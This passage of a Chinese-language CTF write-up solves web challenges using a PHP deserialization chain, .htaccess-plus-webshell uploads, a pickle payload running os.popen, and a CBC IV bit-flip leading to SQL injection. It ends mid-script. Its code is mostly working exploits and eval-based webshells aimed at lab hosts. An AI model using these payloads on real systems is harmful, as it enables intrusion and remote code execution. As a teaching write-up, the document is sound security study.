class="line">$c-&gt;abandon-&gt;abandon =new Upload;</span><br><span class="line">$c-&gt;abandon-&gt;boring =&quot;1&quot;;</span><br><span class="line">$c-&gt;abandon-&gt;code =&quot;1&quot;;</span><br><span class="line"></span><br><span class="line">$c-&gt;boring = &#x27;read&#x27;;</span><br><span class="line">$c-&gt;code = this;</span><br><span class="line"></span><br><span class="line">$ser = serialize([$y1ng,$c]);</span><br><span class="line">var_dump(urlencode($ser));</span><br></pre></td></tr></table></figure>

<p>拿到pass=ob_end_clean_is_surplus</p>
<p>文件上传与网上某题相近</p>
<p>exp.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">SIZE_HEADER = <span class="string">b&quot;\n\n#define width 1337\n#define height 1337\n\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_php_file</span>(<span class="params">filename, script</span>):</span></span><br><span class="line">    phpfile = <span class="built_in">open</span>(filename, <span class="string">&#x27;wb&#x27;</span>) </span><br><span class="line"></span><br><span class="line">    phpfile.write(script.encode(<span class="string">&#x27;utf-16be&#x27;</span>))</span><br><span class="line">    phpfile.write(SIZE_HEADER)</span><br><span class="line"></span><br><span class="line">    phpfile.close()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_htacess</span>():</span></span><br><span class="line">    htaccess = <span class="built_in">open</span>(<span class="string">&#x27;.htaccess&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    htaccess.write(SIZE_HEADER)</span><br><span class="line">    htaccess.write(<span class="string">b&#x27;AddType application/x-httpd-php .fuck\n&#x27;</span>)</span><br><span class="line">    htaccess.write(<span class="string">b&#x27;php_value zend.multibyte 1\n&#x27;</span>)</span><br><span class="line">    htaccess.write(<span class="string">b&#x27;php_value zend.detect_unicode 1\n&#x27;</span>)</span><br><span class="line">    htaccess.write(<span class="string">b&#x27;php_value display_errors 1\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    htaccess.close()</span><br><span class="line">generate_htacess()</span><br><span class="line">generate_php_file(<span class="string">&quot;webshell.fuck&quot;</span>, <span class="string">&quot;&lt;?php eval($_POST[1]); ?&gt;&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>分别上传webshell.fuck,还有.htaccess拿到flag</p>
<h2 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">ccopy_reg</span><br><span class="line">_reconstructor</span><br><span class="line">p0</span><br><span class="line">(c__main__</span><br><span class="line">webSite</span><br><span class="line">p1</span><br><span class="line">c__builtin__</span><br><span class="line">object</span><br><span class="line">p2</span><br><span class="line">Ntp3</span><br><span class="line">Rp4</span><br><span class="line">(dp5</span><br><span class="line">Vname</span><br><span class="line">p6</span><br><span class="line">c__builtin__</span><br><span class="line">getattr</span><br><span class="line">(cos</span><br><span class="line">popen</span><br><span class="line">(S&#x27;dir&#x27;</span><br><span class="line">tRS&#x27;read&#x27;</span><br><span class="line">tR(NtRp7</span><br><span class="line">sVdescribe</span><br><span class="line">p8</span><br><span class="line">V2</span><br><span class="line">p9</span><br><span class="line">sb.</span><br></pre></td></tr></table></figure>

<p>提权没环境复现</p>
<h2 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://172.20.6.106:80/&quot;</span></span><br><span class="line">burp0_url = <span class="string">&quot;http://172.20.6.106:80/index.php&quot;</span></span><br><span class="line">burp0_headers = &#123;<span class="string">&quot;Cache-Control&quot;</span>: <span class="string">&quot;max-age=0&quot;</span>, <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>, <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://172.20.6.106&quot;</span>, <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;multipart/form-data; boundary=----WebKitFormBoundary6ssqFd6DiMBBDuHJ&quot;</span>, <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36&quot;</span>, <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;</span>, <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://172.20.6.106/index.php&quot;</span>, <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9,en;q=0.8&quot;</span>, <span class="string">&quot;x-forwarded-for&quot;</span>: <span class="string">&quot;127.0.0.1&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>&#125;</span><br><span class="line">burp0_data = <span class="string">&quot;------WebKitFormBoundary6ssqFd6DiMBBDuHJ\r\nContent-Disposition: form-data; name=\&quot;file\&quot;; filename=\&quot;htaccess\&quot;\r\nContent-Type: application/octet-stream\r\n\r\nSetHandler application/x-httpd-php\r\n------WebKitFormBoundary6ssqFd6DiMBBDuHJ\r\nContent-Disposition: form-data; name=\&quot;name\&quot;\r\n\r\n.htaccess\r\n------WebKitFormBoundary6ssqFd6DiMBBDuHJ--\r\n&quot;</span></span><br><span class="line">requests.post(burp0_url, headers=burp0_headers, data=burp0_data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">burp0_headers = &#123;<span class="string">&quot;Pragma&quot;</span>: <span class="string">&quot;no-cache&quot;</span>, <span class="string">&quot;Cache-Control&quot;</span>: <span class="string">&quot;no-cache&quot;</span>, <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>, <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36&quot;</span>, <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://172.20.6.106&quot;</span>, <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;multipart/form-data; boundary=----WebKitFormBoundarywAeLpgB3HhSWqVLj&quot;</span>, <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;</span>, <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://172.20.6.106/index.php&quot;</span>, <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9,en;q=0.8&quot;</span>, <span class="string">&quot;x-forwarded-for&quot;</span>: <span class="string">&quot;127.0.0.1&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>&#125;</span><br><span class="line">burp0_data = <span class="string">&quot;------WebKitFormBoundarywAeLpgB3HhSWqVLj\r\nContent-Disposition: form-data; name=\&quot;file\&quot;; filename=\&quot;shell1.jpg\&quot;\r\nContent-Type: image/jpeg\r\n\r\n&lt;?php\neval($_POST[&#x27;a&#x27;]);\n?&gt;\r\n------WebKitFormBoundarywAeLpgB3HhSWqVLj\r\nContent-Disposition: form-data; name=\&quot;name\&quot;\r\n\r\n2.jpg\r\n------WebKitFormBoundarywAeLpgB3HhSWqVLj--\r\n&quot;</span></span><br><span class="line">requests.post(burp0_url, headers=burp0_headers, data=burp0_data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">burp0_data=&#123;<span class="string">&quot;a&quot;</span>:<span class="string">&quot;system(&#x27;cat /flag.txt&#x27;);&quot;</span>&#125;</span><br><span class="line">r=requests.post(url+<span class="string">&quot;upload/2.jpg&quot;</span>, data=burp0_data)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>



<h2 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h2><p>浏览一遍代码后发现一个弱类型比较</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getUser</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&quot;token&quot;</span>])) &#123;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;  <span class="comment">//not login</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$_SESSION</span>[<span class="string">&quot;token&quot;</span>] == <span class="string">&quot;0&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;   <span class="comment">//Administrator//0e绕过</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$key</span> = base64_decode(<span class="variable">$_SESSION</span>[<span class="string">&quot;token&quot;</span>]);</span><br><span class="line">        <span class="variable">$user</span> = explode(<span class="string">&quot;|&quot;</span>, <span class="variable">$key</span>)[<span class="number">0</span>]; <span class="comment">//user</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$user</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$user</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>如果我们能令token以0e[0-9]+的格式的话，就可以绕过身份验证机制</p>
<p>而生成token的代码为：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setUser</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$username</span> == <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$ip</span> == <span class="string">&quot;::1&quot;</span> || <span class="variable">$ip</span> == <span class="string">&quot;127.0.0.1&quot;</span>)&#123;</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="string">&quot;token&quot;</span>] = <span class="number">0</span>;     <span class="comment">//Administrator</span></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;修罗！隐忍！！！&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$key</span> = <span class="variable">$username</span> . <span class="string">&quot;|&quot;</span> . <span class="variable">$password</span>;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&quot;token&quot;</span>] = base64_encode(<span class="variable">$key</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因为0e[0-9]+是在base64中的所以我们构造：<code>username=%D1%EDv%EF%BE&amp;password=%D7m%F8</code></p>
<p>至此获得admin权限</p>
<p>upload处有个任意文件上传，但是我们不知道admin的上传目录，我们不得不进行sql注入</p>
<p>notes.php处有个神奇的todo:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;contents&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$data</span> = getCache();</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$data</span> &amp;&amp; <span class="variable">$data</span>-&gt;contents == <span class="variable">$_POST</span>[<span class="string">&#x27;contents&#x27;</span>]) &#123;</span><br><span class="line">        <span class="variable">$username</span> = <span class="variable">$data</span>-&gt;username;</span><br><span class="line">        <span class="variable">$contents</span> = <span class="variable">$data</span>-&gt;contents;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$contents</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;contents&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cache&#x27;</span>])) &#123;</span><br><span class="line">        setCache(<span class="variable">$username</span>, <span class="variable">$contents</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;缓存成功&#x27;);location.href=&#x27;index.php&#x27;&lt;/script&gt;&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        setcookie(<span class="string">&#x27;cache&#x27;</span>);</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;INSERT INTO notes (uid, contents, time) VALUES ((select id from users where username = &#x27;$&#123;username&#125;&#x27;), &#x27;$&#123;contents&#125;&#x27;, localtime())&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$sql</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$conn</span>-&gt;query(<span class="variable">$sql</span>) === <span class="literal">TRUE</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;提交成功&#x27;);location.href=&#x27;index.php&#x27;&lt;/script&gt;&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Error: &quot;</span> . <span class="variable">$sql</span> . <span class="string">&quot;&lt;br&gt;&quot;</span> . <span class="variable">$conn</span>-&gt;error;</span><br><span class="line">            <span class="comment">//<span class="doctag">TODO:</span>删掉</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果我们能控制$data-&gt;contents == $_POST[‘contents’]，且可以控制<code>$data-&gt;username</code>出现引号逃出引号的包围，就可以进行sql注入了。</p>
<p>而我们的缓存的加密函数是：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CBCCrypt</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$iv</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$encryptKey</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;iv = <span class="string">&quot;cbcisfunsoisbase&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;encryptKey =  file_get_contents(<span class="string">&quot;secret.txt&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">encrypt</span>(<span class="params"><span class="variable">$encryptStr</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$iv</span> = <span class="keyword">$this</span>-&gt;iv;</span><br><span class="line">        <span class="variable">$encryptKey</span> = <span class="keyword">$this</span>-&gt;encryptKey;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$encrypted</span>=openssl_encrypt(<span class="variable">$encryptStr</span>, <span class="string">&#x27;aes-128-cbc&#x27;</span>, <span class="variable">$encryptKey</span>, <span class="literal">true</span>, <span class="variable">$iv</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">return</span> base64_encode(<span class="variable">$iv</span>.<span class="variable">$encrypted</span>);</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">decrypt</span>(<span class="params"><span class="variable">$encryptStr</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$iv</span> = substr(base64_decode(<span class="variable">$encryptStr</span>),<span class="number">0</span>,<span class="number">16</span>);</span><br><span class="line">        <span class="variable">$encryptKey</span> = <span class="keyword">$this</span>-&gt;encryptKey;</span><br><span class="line">        <span class="variable">$encrypted</span> = substr(base64_decode(<span class="variable">$encryptStr</span>),<span class="number">16</span>);</span><br><span class="line">        <span class="variable">$decrypted</span> = openssl_decrypt(<span class="variable">$encrypted</span>, <span class="string">&#x27;aes-128-cbc&#x27;</span>, <span class="variable">$encryptKey</span>, <span class="literal">true</span>, <span class="variable">$iv</span>);</span><br><span class="line">        <span class="keyword">echo</span> openssl_error_string();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$decrypted</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中$iv是受到我们控制的</p>
<p><img src="https://image.3001.net/images/20180228/15198072135832.png!small" alt="image12048"></p>
<p>根据cbc加密的原理我们可以知道，通过修改iv从而修改初始的16个字符串</p>
<p>爆破合适iv的脚本:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">strxor</span>(<span class="params"><span class="variable">$str1</span>,<span class="variable">$str2</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$res</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(strlen(<span class="variable">$str1</span>)!==strlen(<span class="variable">$str2</span>))</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;strlen(<span class="variable">$str1</span>);<span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="variable">$res</span>.=chr(ord(<span class="variable">$str1</span>[<span class="variable">$i</span>])^ord(<span class="variable">$str2</span>[<span class="variable">$i</span>]));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$enc</span>=urldecode(<span class="string">&quot;Y2JjaXNmdW5zb2lzYmFzZUDBRfKeIBJYWfSM2WOSqNOLdJ7UM1Nq%2B9zuKSrAr7O8%2B9AtpndZ00OlTIF0qmDsWw%3D%3D&quot;</span>);</span><br><span class="line"><span class="variable">$cipher</span> = substr(<span class="variable">$enc</span>,<span class="number">16</span>,<span class="number">16</span>);</span><br><span class="line"><span class="variable">$message</span> = substr(<span class="string">&#x27;&#123;&quot;username&quot;:&quot;fucker&quot;,&quot;contents&quot;:&quot;fucker&quot;&#125;&#x27;</span>,<span class="number">0</span>,<span class="number">16</span>);</span><br><span class="line"><span class="variable">$iv</span> = <span class="string">&quot;cbcisfunsoisbase&quot;</span>;</span><br><span class="line"><span class="variable">$before_xor</span>=strxor(<span class="variable">$message</span>,<span class="variable">$iv</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="number">256</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="variable">$iv</span> = <span class="string">&quot;cbcisfunsoisbas&quot;</span>.chr(<span class="variable">$i</span>);</span><br><span class="line">    <span class="variable">$result</span> = strxor(<span class="variable">$iv</span>,<span class="variable">$before_xor</span>);</span><br><span class="line">    <span class="keyword">if</span>(strpos(<span class="variable">$result</span>,<span class="string">&quot;&#x27;&quot;</span>)!==<span class="literal">FALSE</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> urlencode(<span class="variable">$iv</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>.<span class="variable">$result</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">session = requests.session()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reg</span>(<span class="params">session,username</span>):</span></span><br><span class="line">    burp0_url = <span class="string">&quot;http://100.100.1.5:80/ctf/register.php&quot;</span></span><br><span class="line">    burp0_headers = &#123;<span class="string">&quot;Cache-Control&quot;</span>: <span class="string">&quot;max-age=0&quot;</span>, <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>, <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://100.100.1.5&quot;</span>, <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>, <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36&quot;</span>, <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;</span>, <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://100.100.1.5/ctf/register.html&quot;</span>, <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>&#125;</span><br><span class="line">    burp0_data = &#123;<span class="string">&quot;username&quot;</span>: <span class="string">&quot;fuc&quot;</span>+username, <span class="string">&quot;password&quot;</span>: <span class="string">&quot;fucker&quot;</span>, <span class="string">&quot;submit&quot;</span>: <span class="string">&quot;\xe6\xb3\xa8\xe5\x86\x8c&quot;</span>&#125;</span><br><span class="line">    r=session.post(burp0_url, headers=burp0_headers, data=burp0_data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;注册成功&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cache</span>(<span class="params">session</span>):</span></span><br><span class="line">    burp0_url = <span class="string">&quot;http://100.100.1.5:80/ctf/notes.php&quot;</span></span><br><span class="line">    burp0_headers = &#123;<span class="string">&quot;Cache-Control&quot;</span>: <span class="string">&quot;max-age=0&quot;</span>, <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>, <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://100.100.1.5&quot;</span>, <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>, <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36&quot;</span>, <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;</span>, <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://100.100.1.5/ctf/index.php&quot;</span>, <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>&#125;</span><br><span class="line">    burp0_data = &#123;<span class="string">&quot;contents&quot;</span>: <span class="string">&quot;fffffffffffffffffffffffffffffffffff&quot;</span>, <span 